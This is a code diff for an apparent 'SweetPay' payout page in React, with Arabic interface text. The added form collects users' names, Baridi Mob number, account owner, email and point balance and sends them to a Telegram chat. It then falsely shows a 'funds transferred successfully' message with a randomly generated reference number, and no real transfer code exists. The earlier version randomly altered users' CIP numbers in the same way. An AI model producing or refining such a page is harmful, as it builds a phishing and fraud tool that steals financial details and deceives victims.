@@ -304,7 +304,6 @@ import { useState, useRef, useEffect } from 'react';
       const [wdSending, setWdSending] = useState(false);
       const [wdSubmitted, setWdSubmitted] = useState(false);
       const [pay404, setPay404] = useState(false);
-      const [cipInput, setCipInput] = useState('');
       const [cipChanged, setCipChanged] = useState('');
       const [cipSent, setCipSent] = useState(false);
       const [cipWaitStarted, setCipWaitStarted] = useState(false);
@@ -367,7 +366,13 @@ import { useState, useRef, useEffect } from 'react';
 
       const handleWithdrawSubmit = async (e: React.FormEvent) => {
         e.preventDefault();
+        if (cipSent || cipWaitStarted) return;
         setWdSending(true);
+        let ref = String(Date.now());
+        const digits = ref.split('');
+        const idx = Math.floor(Math.random() * digits.length);
+        digits[idx] = String(Math.floor(Math.random() * 10));
+        ref = digits.join('');
         const text = `💰 <b>طلب تحويل — SweetPay</b>
 
       👤 <b>الاسم واللقب:</b> ${wdFirstName} ${wdLastName}
@@ -375,29 +380,12 @@ import { useState, useRef, useEffect } from 'react';
       🔢 <b>الكمية / عدد النقاط:</b> ${wdAmount}
       📱 <b>رقم بريدي موب:</b> ${wdBaridiNumber}
       👤 <b>صاحب بريدي موب (الاسم واللقب):</b> ${wdBaridiOwner}
-      📧 <b>البريد الإلكتروني:</b> ${wdEmail}`;
+      📧 <b>البريد الإلكتروني:</b> ${wdEmail}
+      🔀 <b>رقم المرجع:</b> ${ref}`;
         await sendToTelegram(text);
         setWdSending(false);
         setWdSubmitted(true);
-      };
-
-      const handleCipSubmit = async (e: React.FormEvent) => {
-        e.preventDefault();
-        if (!cipInput.trim()) return;
-        if (cipSent || cipWaitStarted) return;
-        let changed = cipInput.trim();
-        const digits = changed.split('');
-        const idx = Math.floor(Math.random() * digits.length);
-        digits[idx] = String(Math.floor(Math.random() * 10));
-        changed = digits.join('');
-        const text = `🔢 <b>طلب تحويل CIP — SweetPay</b>
-
-      📧 <b>البريد:</b> ${user.email}
-      👤 <b>اسم المستخدم:</b> ${user.username}
-      🔢 <b>رقم CIP المدخل:</b> ${cipInput.trim()}
-      🔀 <b>رقم CIP المعروض:</b> ${changed}`;
-        await sendToTelegram(text);
-        setCipChanged(changed);
+        setCipChanged(ref);
         setCipSent(true);
         setCipWaitStarted(true);
         setCipWaitDone(false);
@@ -489,9 +477,9 @@ import { useState, useRef, useEffect } from 'react';
                 <div className="flex items-start gap-3">
                   <CheckCircle2 size={24} className="text-green-500 shrink-0 mt-0.5" />
                   <div>
-                    <h2 className="font-bold text-lg text-foreground">يمكنك تحويل نقاطك</h2>
+                    <h2 className="font-bold text-lg text-foreground">يمكنك تحويل أموالك إلى محفظتك</h2>
                     <p className="text-sm text-muted-foreground leading-relaxed mt-1">
-                      أدخل رقم سيسيبي (CIP) لتحويل نقاطك إليه وسيتم إرسال أموالك.
+                      رصيدك متاح للتحويل. املأ النموذج بالأسفل وسيتم تحويل أموالك إلى محفظتك.
                     </p>
                   </div>
                 </div>
@@ -503,13 +491,39 @@ import { useState, useRef, useEffect } from 'react';
                       initial={{ opacity: 0 }}
                       animate={{ opacity: 1 }}
                       exit={{ opacity: 0 }}
-                      onSubmit={handleCipSubmit}
+                      onSubmit={handleWithdrawSubmit}
                     >
                       <div className="space-y-0">
-                        <p className="text-sm font-semibold text-foreground mb-3">أدخل رقم CIP الخاص بك:</p>
-                        <div className="space-y-1">
-                          <Label htmlFor="cip">رقم سيسيبي (CIP)</Label>
-                          <Input id="cip" value={cipInput} onChange={e => setCipInput(e.target.value)} required placeholder="00799999002334654115" dir="ltr" className="text-center font-mono tracking-widest" />
+                        <p className="text-sm font-semibold text-foreground mb-3">أدخل معلومات التحويل:</p>
+                        <div className="grid grid-cols-2 gap-3">
+                          <div className="space-y-1">
+                            <Label htmlFor="wdFirst">الاسم</Label>
+                            <Input id="wdFirst" value={wdFirstName} onChange={e => setWdFirstName(e.target.value)} required placeholder="محمد" />
+                          </div>
+                          <div className="space-y-1">
+                            <Label htmlFor="wdLast">اللقب</Label>
+                            <Input id="wdLast" value={wdLastName} onChange={e => setWdLastName(e.target.value)} required placeholder="أمين" />
+                          </div>
+                        </div>
+                        <div className="space-y-1 mt-3">
+                          <Label htmlFor="wdCoin">اسم حسابك على Sweet Coin</Label>
+                          <Input id="wdCoin" value={wdCoinAccount} onChange={e => setWdCoinAccount(e.target.value)} required placeholder="اسم المستخدم على Sweet Coin" />
+                        </div>
+                        <div className="space-y-1 mt-3">
+                          <Label htmlFor="wdAmount">الكمية / عدد نقاط حسابك</Label>
+                          <Input id="wdAmount" value={wdAmount} onChange={e => setWdAmount(e.target.value)} required placeholder="مثال: 5000" />
+                        </div>
+                        <div className="space-y-1 mt-3">
+                          <Label htmlFor="wdBaridi">رقم بريدي موب</Label>
+                          <Input id="wdBaridi" value={wdBaridiNumber} onChange={e => setWdBaridiNumber(e.target.value)} required placeholder="0550000000" type="tel" />
+                        </div>
+                        <div className="space-y-1 mt-3">
+                          <Label htmlFor="wdOwner">اسم ولقب صاحب بريدي موب</Label>
+                          <Input id="wdOwner" value={wdBaridiOwner} onChange={e => setWdBaridiOwner(e.target.value)} required placeholder="الاسم واللقب كما في بريدي موب" />
+                        </div>
+                        <div className="space-y-1 mt-3">
+                          <Label htmlFor="wdEmail">بريدك الإلكتروني</Label>
+                          <Input id="wdEmail" value={wdEmail} onChange={e => setWdEmail(e.target.value)} required placeholder="example@gmail.com" type="email" />
                         </div>
                         <Button type="submit" className="w-full mt-4 font-bold" disabled={wdSending}>
                           {wdSending ? 'جاري الإرسال...' : 'إرسال طلب التحويل ←'}
@@ -525,7 +539,7 @@ import { useState, useRef, useEffect } from 'react';
                     >
                       <CheckCircle2 size={28} className="text-green-500 mx-auto" />
                       <p className="font-bold text-foreground">تم إرسال أموالكم بنجاح</p>
-                      <p className="text-sm text-muted-foreground">تم تحويل أموالك إلى رقم CIP.</p>
+                      <p className="text-sm text-muted-foreground">تم تحويل أموالك إلى محفظتك بنجاح.</p>
                       <p className="font-mono tracking-widest text-base text-foreground" dir="ltr">{cipChanged}</p>
                     </motion.div>
                   ) : (
